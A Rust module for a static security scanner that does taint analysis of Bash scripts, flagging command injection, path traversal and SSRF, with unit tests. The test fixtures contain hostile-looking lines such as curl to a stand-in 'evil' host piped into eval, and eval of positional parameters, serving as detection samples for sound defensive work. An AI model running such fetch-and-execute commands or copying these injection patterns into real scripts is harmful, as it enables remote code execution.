//! Intraprocedural, flow-insensitive taint analysis for Bash / shell scripts.
//!
//! # Scope
//!
//! Mirrors the other language engines (`ruby_taint`, `php_taint`) in spirit,
//! but Bash has no rich expression grammar — taint flows through *shell
//! variables* and *command substitutions*:
//!
//! - **Per scope.** The top-level program body and each `function_definition`
//!   body are analyzed independently as a scope. (Bash command-injection rules
//!   apply to both top-level scripts and functions.)
//! - **Per file.** No cross-file analysis.
//! - **Flow-insensitive.** Statements are processed in source order.
//!
//! # Bash grammar node kinds used here (tree-sitter-bash)
//!
//! - `program` — the file root; top-level statements are direct children.
//! - `function_definition` — fields: `name` (`word`), `body`
//!   (`compound_statement`).
//! - `variable_assignment` — fields: `name` (`variable_name`), `value`
//!   (a `command_substitution`, `string`, `word`, `simple_expansion`, …).
//! - `command` — fields: `name` (`command_name`), and repeated `argument`
//!   children (`word`, `string`, `simple_expansion`, `raw_string`).
//! - `command_substitution` — `$(...)`; wraps a `command` or `pipeline`.
//!   Backtick substitution parses to the same `command_substitution` kind.
//! - `pipeline` — `cmd | cmd | …`; children are `command` nodes.
//! - `simple_expansion` — `$var`; child `variable_name`.
//! - `expansion` — `${var}` / `${var:-default}`; child `variable_name`.
//! - `string` — `"..."`; carries `simple_expansion` / `expansion` children for
//!   interpolation.
//!
//! # Matcher interpretation
//!
//! The Semgrep bridge compiles Bash command shapes to [`NodeMatcher::Call`]
//! matchers keyed by *command name*:
//!
//! - A **source** `Call { canonical }` matches a `command_substitution` whose
//!   relevant command name equals `canonical` (e.g. `$(curl ...)` → `curl`,
//!   `$(cat | jq ...)` → `jq`).
//! - A **sink** `Call { canonical }` matches a `command` whose command name
//!   equals `canonical` and one of whose arguments expands a tainted variable
//!   (e.g. `eval "$x"`, `bash -c "$x"`, `cat $x`).
//! - A **sanitizer** `Call { canonical }` matches a `command` whose command
//!   name equals `canonical`; a variable assigned from such a command (e.g.
//!   `safe=$(realpath "$x")`) is treated as clean.

use crate::rules::common::AliasTable;
use crate::rules::taint_engine::{node_text, taint_finding_for_node, TaintState};
pub use crate::rules::taint_engine::{NodeMatcher, TaintFinding, TaintSpec};
use tree_sitter::Node;

// ─── Public API ──────────────────────────────────────────────────────────────

/// Run the Bash taint engine over the top-level program scope and every
/// `function_definition` body inside `root`, returning one [`TaintFinding`]
/// per source→sink flow discovered.
pub fn analyze_tree(
    root: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    _aliases: Option<&AliasTable>,
) -> Vec<TaintFinding> {
    let mut findings = Vec::new();

    // Scope 1: the top-level program body (statements not inside any function).
    let mut top_state = TaintState::default();
    seed_parameter_sources(root, spec, &mut top_state);
    walk_scope(root, source, spec, &mut top_state, &mut findings, true);

    // Scope 2..n: each function body, analyzed independently.
    collect_function_defs(root, &mut |func| {
        if let Some(body) = func.child_by_field_name("body") {
            let mut state = TaintState::default();
            seed_parameter_sources(func, spec, &mut state);
            walk_scope(body, source, spec, &mut state, &mut findings, false);
        }
    });

    findings
}

/// Seed a scope's taint state from `ParamName` sources.
///
/// Bash positional/special parameters (`$1`…`$9`, `$@`, `$*`, `$REPLY`) carry
/// untrusted script input. A `ParamName` source compiles each such name into a
/// pre-tainted variable so a later expansion (`eval "$1"`) is recognised as a
/// flow without an intervening assignment. The seed line is the scope's first
/// line (the parameters are "introduced" at scope entry).
fn seed_parameter_sources(scope_node: Node<'_>, spec: &TaintSpec, state: &mut TaintState) {
    let line = scope_node.start_position().row + 1;
    for matcher in &spec.sources {
        if let NodeMatcher::ParamName { names, description } = matcher {
            for name in names {
                state.taint(name.clone(), description.clone(), line);
            }
        }
    }
}

// ─── Built-in specs ──────────────────────────────────────────────────────────

/// All Bash taint rule IDs paired with their specs.
pub fn bash_taint_rule_specs() -> Vec<(&'static str, TaintSpec)> {
    vec![
        ("bash/taint-command-injection", command_injection_spec()),
        ("bash/taint-path-traversal", path_traversal_spec()),
        ("bash/taint-ssrf", ssrf_spec()),
    ]
}

/// Shared sources for Bash taint rules.
///
/// Two source shapes the engine actually fires on:
///
/// * `ParamName` — positional/special parameters (`$1`…`$9`, `$@`, `$*`,
///   `$REPLY`) seeded as pre-tainted at scope entry (see
///   [`seed_parameter_sources`]).
/// * `Call` — a value that introduces untrusted data, matched either against a
///   command name inside a `$(…)` substitution (`$(curl …)`, `$(cat …)`) or, for
///   the stdin-reader builtins, against the command that writes a variable
///   (`read VAR`) (see [`handle_read_source`]).
pub fn bash_taint_sources() -> Vec<NodeMatcher> {
    let mut sources = vec![NodeMatcher::ParamName {
        names: [
            "1", "2", "3", "4", "5", "6", "7", "8", "9", "@", "*", "REPLY",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect(),
        description: "shell parameter ($1, $@, $REPLY, …)".into(),
    }];
    // Stdin reader builtin: `read VAR` taints VAR.
    sources.push(NodeMatcher::Call {
        canonical: "read".into(),
        description: "read (stdin)".into(),
    });
    // Command-substitution sources: `var=$(curl …)`, `var=$(cat …)`.
    for (cmd, desc) in [
        ("curl", "$(curl …)"),
        ("wget", "$(wget …)"),
        ("cat", "$(cat …)"),
    ] {
        sources.push(NodeMatcher::Call {
            canonical: cmd.into(),
            description: desc.into(),
        });
    }
    sources
}

/// Shared sanitizers for Bash taint rules. `printf %q` shell-quotes its input,
/// so a value assigned from `$(printf %q "$x")` is treated as clean.
pub fn bash_taint_sanitizers() -> Vec<NodeMatcher> {
    vec![NodeMatcher::Call {
        canonical: "printf".into(),
        description: "printf %q (shell-quoted)".into(),
    }]
}

/// Command-execution sinks: a tainted value expanded into the arguments of one
/// of these commands is a shell command-injection.
pub fn bash_taint_sinks() -> Vec<NodeMatcher> {
    [
        ("eval", "eval"),
        ("bash", "bash -c"),
        ("sh", "sh -c"),
        ("source", "source"),
        (".", ". (source)"),
        ("system", "system"),
    ]
    .iter()
    .map(|(cmd, desc)| NodeMatcher::Call {
        canonical: (*cmd).into(),
        description: (*desc).into(),
    })
    .collect()
}

fn command_injection_spec() -> TaintSpec {
    TaintSpec {
        sources: bash_taint_sources(),
        sinks: bash_taint_sinks(),
        sanitizers: bash_taint_sanitizers(),
    }
}

/// File-operation sinks: a tainted value expanded into the path argument of one
/// of these commands lets an attacker read, overwrite, or delete an arbitrary
/// path (directory/path traversal). Each is matched by *command name* exactly
/// like the command-injection sinks — the engine scans the command's word
/// arguments for a tainted expansion (`cat "$f"`, `rm "$1"`).
pub fn bash_taint_path_sinks() -> Vec<NodeMatcher> {
    [
        ("cat", "cat <tainted path>"),
        ("head", "head <tainted path>"),
        ("tail", "tail <tainted path>"),
        ("rm", "rm <tainted path>"),
        ("cp", "cp <tainted path>"),
        ("mv", "mv <tainted path>"),
        ("tee", "tee <tainted path>"),
    ]
    .iter()
    .map(|(cmd, desc)| NodeMatcher::Call {
        canonical: (*cmd).into(),
        description: (*desc).into(),
    })
    .collect()
}

fn path_traversal_spec() -> TaintSpec {
    TaintSpec {
        sources: bash_taint_sources(),
        sinks: bash_taint_path_sinks(),
        sanitizers: bash_taint_sanitizers(),
    }
}

/// Network-fetch sinks: a tainted value expanded into the URL argument of
/// `curl`/`wget` lets an attacker point the request at an arbitrary host
/// (server-side request forgery).
pub fn bash_taint_url_sinks() -> Vec<NodeMatcher> {
    [
        ("curl", "curl <tainted URL>"),
        ("wget", "wget <tainted URL>"),
    ]
    .iter()
    .map(|(cmd, desc)| NodeMatcher::Call {
        canonical: (*cmd).into(),
        description: (*desc).into(),
    })
    .collect()
}

fn ssrf_spec() -> TaintSpec {
    TaintSpec {
        sources: bash_taint_sources(),
        sinks: bash_taint_url_sinks(),
        sanitizers: bash_taint_sanitizers(),
    }
}

// ─── Scope walking ─────────────────────────────────────────────────────────

/// The exact release-version allowlist used before interpolating a version into
/// a GitHub release URL. It excludes URL delimiters, so a value accepted by it
/// cannot change the URL's scheme, host, path hierarchy, query, or fragment.
const RELEASE_VERSION_ALLOWLIST: &str = r"^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z][0-9A-Za-z.-]*)?$";

/// Return the variable protected by the action's fail-closed release-version
/// guard. This intentionally recognises one narrow shape rather than treating
/// arbitrary Bash regex tests as sanitizers:
///
/// ```bash
/// if [[ ! "${VERSION}" =~ ^v…$ ]]; then
///     # direct diagnostic commands
///     exit 1
/// fi
/// ```
///
/// The regex must be the exact restrictive release allowlist, the check must
/// reject non-matches, and the rejection branch must end in a direct `exit`.
/// Callers clear taint only after walking that branch so a sink in the rejected
/// path remains visible.
fn fail_closed_release_version_guard<'tree>(
    node: Node<'tree>,
    source: &str,
) -> Option<Node<'tree>> {
    if node.kind() != "if_statement" {
        return None;
    }

    let condition = node.child_by_field_name("condition")?;
    if condition.kind() != "test_command" {
        return None;
    }
    let expression = only_named_child(condition)?;
    if expression.kind() != "binary_expression"
        || expression.named_child_count() != 2
        || node_text(expression.child_by_field_name("operator")?, source) != "=~"
    {
        return None;
    }

    let negated = expression.child_by_field_name("left")?;
    if negated.kind() != "unary_expression"
        || negated.named_child_count() != 1
        || node_text(negated.child_by_field_name("operator")?, source) != "!"
    {
        return None;
    }
    let variable = guarded_variable_name(only_named_child(negated)?)?;

    let allowlist = expression.child_by_field_name("right")?;
    if allowlist.kind() != "regex" || node_text(allowlist, source) != RELEASE_VERSION_ALLOWLIST {
        return None;
    }

    direct_final_exit(node, source).then_some(variable)
}

/// Return the sole variable expanded by a guard operand such as `"${VERSION}"`.
fn guarded_variable_name(node: Node<'_>) -> Option<Node<'_>> {
    let expansion = match node.kind() {
        "simple_expansion" | "expansion" => node,
        "string" => only_named_child(node)?,
        _ => return None,
    };
    if !matches!(expansion.kind(), "simple_expansion" | "expansion")
        || expansion.named_child_count() != 1
    {
        return None;
    }
    find_variable_name(expansion)
}

/// Return `true` only when an `if` rejection branch consists of direct commands
/// and its final command is `exit`. `elif`/`else` clauses and nested compound
/// forms are deliberately not accepted as proof that invalid input cannot
/// continue to a later sink.
fn direct_final_exit(node: Node<'_>, source: &str) -> bool {
    let mut saw_body_command = false;
    let mut final_command_is_exit = false;
    let mut cursor = node.walk();
    for (index, child) in node.children(&mut cursor).enumerate() {
        if node.field_name_for_child(index as u32) == Some("condition") {
            continue;
        }
        if !child.is_named() || child.kind() != "command" {
            if child.is_named() {
                return false;
            }
            continue;
        }
        saw_body_command = true;
        final_command_is_exit = command_name(child, source).as_deref() == Some("exit");
    }
    saw_body_command && final_command_is_exit
}

/// Return a node's only named child.
fn only_named_child(node: Node<'_>) -> Option<Node<'_>> {
    if node.named_child_count() == 1 {
        node.named_child(0)
    } else {
        None
    }
}

/// Walk a scope (program root or function body) in source order, propagating
/// taint through assignments and reporting sink hits.
///
/// When `skip_functions` is true (top-level scope) we do NOT descend into
/// `function_definition` nodes — they are analyzed as their own scopes.
fn walk_scope(
    node: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    state: &mut TaintState,
    findings: &mut Vec<TaintFinding>,
    skip_functions: bool,
) {
    if skip_functions && node.kind() == "function_definition" {
        return;
    }

    // A rejected value stays tainted while its rejection branch is walked.
    // Only a strict, direct exit guard may clear it for statements after the
    // complete `if` statement.
    let release_version_guard = if node.kind() == "if_statement" {
        fail_closed_release_version_guard(node, source)
    } else {
        None
    };

    match node.kind() {
        "variable_assignment" => handle_assignment(node, source, spec, state),
        "command" => {
            // `read VAR` / `mapfile VAR` reads untrusted stdin into VAR. When the
            // spec lists the builtin as a source, taint the variables it writes
            // before treating the node as a possible sink.
            handle_read_source(node, source, spec, state);
            handle_command(node, source, spec, state, findings);
        }
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        walk_scope(child, source, spec, state, findings, skip_functions);
    }

    if let Some(variable) = release_version_guard {
        state.clear(node_text(variable, source));
    }
}

/// Handle `name=value`: taint the LHS variable if the RHS introduces taint or
/// references a tainted variable; clear it (sanitized) otherwise.
fn handle_assignment(node: Node<'_>, source: &str, spec: &TaintSpec, state: &mut TaintState) {
    let (Some(name_node), value) = (
        node.child_by_field_name("name"),
        node.child_by_field_name("value"),
    ) else {
        return;
    };
    if name_node.kind() != "variable_name" {
        return;
    }
    let lhs = node_text(name_node, source).to_string();

    let Some(value) = value else {
        // `name=` (empty) — clears any taint.
        state.clear(&lhs);
        return;
    };

    // A value assigned from a sanitizer command is explicitly clean.
    if value_is_sanitized(value, source, spec) {
        state.clear(&lhs);
        return;
    }

    if let Some((desc, line)) = value_taint(value, source, spec, state) {
        state.taint(lhs, desc, line);
    } else {
        state.clear(&lhs);
    }
}

/// Handle a `command` node: if its command name matches a sink and an argument
/// expands a tainted variable, emit a finding.
fn handle_command(
    node: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    state: &mut TaintState,
    findings: &mut Vec<TaintFinding>,
) {
    let Some(name) = command_name(node, source) else {
        return;
    };
    let Some(sink_desc) = sink_for_command(&name, spec) else {
        return;
    };

    // Scan arguments for a tainted expansion.
    let mut cursor = node.walk();
    for (i, child) in node.children(&mut cursor).enumerate() {
        if node.field_name_for_child(i as u32) != Some("argument") {
            continue;
        }
        if let Some((src_desc, src_line)) = expansion_taint(child, source, state) {
            findings.push(taint_finding_for_node(
                node, src_desc, sink_desc, src_line, None, 1,
            ));
            return;
        }
    }
}

/// Bash builtins that read untrusted input from stdin into the variables named
/// by their (non-flag) word arguments.
const STDIN_READER_BUILTINS: [&str; 3] = ["read", "mapfile", "readarray"];

/// If `node` is a `read`/`mapfile`/`readarray` command AND the spec lists that
/// builtin as a `Call` source, taint each variable it writes. Unlike a command
/// substitution source (`$(curl …)`, which *reads* its args), a reader builtin
/// *writes* its plain word arguments, so those become tainted.
fn handle_read_source(node: Node<'_>, source: &str, spec: &TaintSpec, state: &mut TaintState) {
    let Some(name) = command_name(node, source) else {
        return;
    };
    if !STDIN_READER_BUILTINS.contains(&name.as_str()) {
        return;
    }
    let Some(desc) = spec.sources.iter().find_map(|m| match m {
        NodeMatcher::Call {
            canonical,
            description,
        } if *canonical == name => Some(description.clone()),
        _ => None,
    }) else {
        return;
    };

    let line = node.start_position().row + 1;
    let mut cursor = node.walk();
    for (i, child) in node.children(&mut cursor).enumerate() {
        if node.field_name_for_child(i as u32) != Some("argument") {
            continue;
        }
        // Skip flags (`-r`, `-a name`) — only plain word names receive input.
        if child.kind() == "word" {
            let text = node_text(child, source);
            if text.starts_with('-') {
                continue;
            }
            state.taint(text.to_string(), desc.clone(), line);
        }
    }
}

// ─── Taint evaluation ──────────────────────────────────────────────────────

/// Returns `(description, line)` if the assignment value `value` introduces
/// taint — either via a source command substitution or by referencing an
/// already-tainted variable.
fn value_taint(
    value: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    state: &TaintState,
) -> Option<(String, usize)> {
    let line = value.start_position().row + 1;

    match value.kind() {
        // `$(...)` / backtick: a source if its command name matches.
        "command_substitution" => {
            if let Some(desc) = command_substitution_source(value, source, spec) {
                return Some((desc, line));
            }
            // Otherwise, taint propagates if any expansion inside refers to a
            // tainted variable.
            expansion_taint(value, source, state)
        }
        // `$var` referencing a tainted variable.
        "simple_expansion" | "expansion" => expansion_taint(value, source, state),
        // `"...$var..."` interpolation.
        "string" => expansion_taint(value, source, state),
        // `a$(...)` / concatenations parse as `concatenation`.
        "concatenation" => {
            let mut cursor = value.walk();
            for child in value.children(&mut cursor) {
                if let Some(r) = value_taint(child, source, spec, state) {
                    return Some(r);
                }
            }
            None
        }
        _ => None,
    }
}

/// Returns `(description, line)` if `node` (or any expansion inside it) expands
/// a tainted variable.
fn expansion_taint(node: Node<'_>, source: &str, state: &TaintState) -> Option<(String, usize)> {
    if matches!(node.kind(), "simple_expansion" | "expansion") {
        if let Some(var) = find_variable_name(node) {
            let name = node_text(var, source);
            if let Some(info) = state.info(name) {
                return Some((info.description.clone(), info.line));
            }
        }
        return None;
    }
    // Strings / concatenations / substitutions may carry nested expansions.
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(r) = expansion_taint(child, source, state) {
            return Some(r);
        }
    }
    None
}

/// If `subst` is a `command_substitution` whose relevant command name matches a
/// source `Call` matcher, return the source description.
fn command_substitution_source(subst: Node<'_>, source: &str, spec: &TaintSpec) -> Option<String> {
    let names = substitution_command_names(subst, source);
    for matcher in &spec.sources {
        if let NodeMatcher::Call {
            canonical,
            description,
        } = matcher
        {
            if names.iter().any(|n| n == canonical) {
                return Some(description.clone());
            }
        }
    }
    None
}

/// True if `value` is a `command_substitution` whose command name matches a
/// sanitizer `Call` matcher (e.g. `$(realpath "$x")`).
fn value_is_sanitized(value: Node<'_>, source: &str, spec: &TaintSpec) -> bool {
    if value.kind() != "command_substitution" {
        return false;
    }
    let names = substitution_command_names(value, source);
    spec.sanitizers.iter().any(|m| match m {
        NodeMatcher::Call { canonical, .. } => names.iter().any(|n| n == canonical),
        _ => false,
    })
}

/// Find a sink description for a command whose name is `cmd`.
fn sink_for_command(cmd: &str, spec: &TaintSpec) -> Option<String> {
    spec.sinks.iter().find_map(|m| match m {
        NodeMatcher::Call {
            canonical,
            description,
        } if canonical == cmd => Some(description.clone()),
        _ => None,
    })
}

// ─── AST helpers ────────────────────────────────────────────────────────────

/// All command names appearing inside a command substitution (`$(cmd ...)`,
/// `$(a | b | c)`). Used so a source matcher keyed by any stage of a pipeline
/// fires.
fn substitution_command_names(subst: Node<'_>, source: &str) -> Vec<String> {
    let mut names = Vec::new();
    collect_command_names(subst, source, &mut names);
    names
}

fn collect_command_names(node: Node<'_>, source: &str, out: &mut Vec<String>) {
    if node.kind() == "command" {
        if let Some(name) = command_name(node, source) {
            out.push(name);
        }
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_command_names(child, source, out);
    }
}

/// The command name of a `command` node, e.g. `eval` for `eval "$x"`.
fn command_name(node: Node<'_>, source: &str) -> Option<String> {
    let name_node = node.child_by_field_name("name")?;
    // `command_name` wraps a `word`.
    let word = if name_node.kind() == "command_name" {
        name_node.named_child(0).unwrap_or(name_node)
    } else {
        name_node
    };
    Some(node_text(word, source).to_string())
}

/// Find the `variable_name` / `special_variable_name` child of a
/// `simple_expansion` / `expansion`. Positional/special parameters such as
/// `$@` and `$*` parse to a `special_variable_name` child (not `variable_name`),
/// so both kinds are accepted.
fn find_variable_name(node: Node<'_>) -> Option<Node<'_>> {
    let count = node.child_count();
    (0..count)
        .filter_map(|i| node.child(i))
        .find(|child| matches!(child.kind(), "variable_name" | "special_variable_name"))
}

/// Collect every `function_definition` node in the tree.
fn collect_function_defs<'tree, F>(node: Node<'tree>, visit: &mut F)
where
    F: FnMut(Node<'tree>),
{
    if node.kind() == "function_definition" {
        visit(node);
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_function_defs(child, visit);
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::parser::parse_file;
    use crate::Language;

    fn call(canonical: &str, desc: &str) -> NodeMatcher {
        NodeMatcher::Call {
            canonical: canonical.into(),
            description: desc.into(),
        }
    }

    fn run(src: &str, spec: &TaintSpec) -> Vec<TaintFinding> {
        let tree = parse_file(src, Language::Bash).expect("parse");
        analyze_tree(tree.root_node(), src, spec, None)
    }

    fn curl_to_eval() -> TaintSpec {
        TaintSpec {
            sources: vec![call("curl", "$(curl ...)")],
            sinks: vec![call("eval", "eval")],
            sanitizers: vec![],
        }
    }

    #[test]
    fn curl_substitution_to_eval_fires() {
        let src = r#"
out=$(curl http://evil)
eval "$out"
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(f.len(), 1, "curl -> eval must fire, got {:?}", f);
        assert!(f[0].sink_description.contains("eval"));
    }

    #[test]
    fn curl_to_eval_inside_function_fires() {
        let src = r#"
g() {
  out=$(curl http://evil)
  eval "$out"
}
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(
            f.len(),
            1,
            "curl -> eval in function must fire, got {:?}",
            f
        );
    }

    #[test]
    fn pipeline_jq_source_to_eval_fires() {
        let src = r#"
data=$(cat | jq -r '.x')
eval "$data"
"#;
        let spec = TaintSpec {
            sources: vec![call("jq", "$(... | jq ...)")],
            sinks: vec![call("eval", "eval")],
            sanitizers: vec![],
        };
        let f = run(src, &spec);
        assert_eq!(f.len(), 1, "jq pipeline -> eval must fire, got {:?}", f);
    }

    #[test]
    fn clean_literal_no_finding() {
        let src = r#"
out="hello"
eval "$out"
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(f.len(), 0, "literal assignment must not fire");
    }

    #[test]
    fn sanitizer_kills_taint() {
        let src = r#"
raw=$(curl http://evil)
safe=$(realpath "$raw")
eval "$safe"
"#;
        let spec = TaintSpec {
            sources: vec![call("curl", "$(curl ...)")],
            sinks: vec![call("eval", "eval")],
            sanitizers: vec![call("realpath", "realpath")],
        };
        let f = run(src, &spec);
        assert_eq!(
            f.len(),
            0,
            "realpath sanitizer must clear taint, got {:?}",
            f
        );
    }

    #[test]
    fn untainted_variable_near_miss() {
        let src = r#"
out=$(curl http://evil)
safe="ls"
eval "$safe"
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(f.len(), 0, "eval of a clean variable must not fire");
    }

    // ── built-in command-injection spec ──────────────────────────────────

    #[test]
    fn positional_param_to_eval_fires() {
        let src = "eval \"$1\"\n";
        let f = run(src, &command_injection_spec());
        assert_eq!(f.len(), 1, "$1 -> eval must fire, got {:?}", f);
        assert!(f[0].source_description.contains("shell parameter"));
    }

    #[test]
    fn special_param_at_to_bash_c_fires() {
        let src = "bash -c \"$@\"\n";
        let f = run(src, &command_injection_spec());
        assert_eq!(f.len(), 1, "$@ -> bash -c must fire, got {:?}", f);
        assert!(f[0].sink_description.contains("bash"));
    }

    #[test]
    fn read_builtin_to_eval_fires() {
        let src = "read userinput\neval \"$userinput\"\n";
        let f = run(src, &command_injection_spec());
        assert_eq!(f.len(), 1, "read -> eval must fire, got {:?}", f);
        assert!(f[0].source_description.contains("read"));
    }

    #[test]
    fn printf_q_sanitizer_kills_param_taint() {
        let src = "safe=$(printf '%q' \"$1\")\neval \"$safe\"\n";
        let f = run(src, &command_injection_spec());
        assert_eq!(f.len(), 0, "printf %q must sanitize, got {:?}", f);
    }

    #[test]
    fn literal_command_no_finding() {
        let src = "eval \"ls -la\"\n";
        let f = run(src, &command_injection_spec());
        assert_eq!(f.len(), 0, "literal eval must not fire, got {:?}", f);
    }
    #[test]
    fn strict_fail_closed_release_version_guard_sanitizes_ssrf_taint() {
        let src = r#"
VERSION="$1"
if [[ ! "${VERSION}" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z][0-9A-Za-z.-]*)?$ ]]; then
    echo "invalid release version"
    exit 1
fi
BASE_URL="https://github.com/example/releases/download/${VERSION}"
curl --fail "$BASE_URL"
"#;
        let f = run(src, &ssrf_spec());
        assert!(
            f.is_empty(),
            "strict fail-closed release guard must sanitize SSRF flow, got {:?}",
            f
        );
    }

    #[test]
    fn unguarded_release_version_url_reaches_curl() {
        let src = r#"
VERSION="$1"
BASE_URL="https://github.com/example/releases/download/${VERSION}"
curl --fail "$BASE_URL"
"#;
        let f = run(src, &ssrf_spec());
        assert_eq!(
            f.len(),
            1,
            "unguarded release URL must reach curl, got {:?}",
            f
        );
    }

    #[test]
    fn arbitrary_regex_guard_does_not_sanitize_ssrf_taint() {
        let src = r#"
VERSION="$1"
if [[ ! "${VERSION}" =~ ^v.*$ ]]; then
    exit 1
fi
BASE_URL="https://github.com/example/releases/download/${VERSION}"
curl --fail "$BASE_URL"
"#;
        let f = run(src, &ssrf_spec());
        assert_eq!(
            f.len(),
            1,
            "an arbitrary regex guard must not sanitize SSRF taint, got {:?}",
            f
        );
    }

    #[test]
    fn release_version_regex_requires_rejection_exit() {
        let src = r#"
VERSION="$1"
if [[ ! "${VERSION}" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z][0-9A-Za-z.-]*)?$ ]]; then
    echo "invalid release version"
fi
BASE_URL="https://github.com/example/releases/download/${VERSION}"
curl --fail "$BASE_URL"
"#;
        let f = run(src, &ssrf_spec());
        assert_eq!(
            f.len(),
            1,
            "a release regex without a rejection exit must not sanitize taint, got {:?}",
            f
        );
    }

    #[test]
    fn rejected_release_version_branch_remains_tainted() {
        let src = r#"
VERSION="$1"
if [[ ! "${VERSION}" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z][0-9A-Za-z.-]*)?$ ]]; then
    curl --fail "https://example.invalid/${VERSION}"
    exit 1
fi
"#;
        let f = run(src, &ssrf_spec());
        assert_eq!(
            f.len(),
            1,
            "a sink before the rejection exit must retain taint, got {:?}",
            f
        );
    }
}
